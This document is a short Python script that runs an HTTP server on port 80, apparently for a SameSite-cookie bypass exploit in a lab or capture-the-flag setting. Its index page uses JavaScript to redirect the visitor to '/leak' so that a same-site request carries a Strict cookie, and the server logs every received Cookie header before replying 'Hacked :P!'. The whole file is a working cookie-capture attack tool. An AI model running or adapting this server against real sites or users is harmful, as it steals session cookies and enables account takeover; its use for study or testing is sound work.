from http.server import BaseHTTPRequestHandler, HTTPServer

index= """<!DOCTYPE html>
<html>
  <body>
    <script>
      // Escalate to a same-site request that will include the Strict cookie
      window.open("/leak", "_self");
    </script>
  </body>
</html>"""

class VerboseHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Log full request info (like built-in http.server)
        print(f"{self.client_address[0]} - - [{self.log_date_time_string()}] \"{self.requestline}\" {200}")

        # Extract and print cookies
        cookies = self.headers.get('Cookie', '')
        if cookies:
            print(f"[+] Cookie: {cookies}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        if self.path == "/":
            self.wfile.write(index.encode())
        else:
            self.wfile.write("<p>Hacked :P!</p>".encode())

if __name__ == '__main__':
    server_address = ('', 80)
    httpd = HTTPServer(server_address, VerboseHandler)
    print("[*] Listening on port 80...")
    httpd.serve_forever()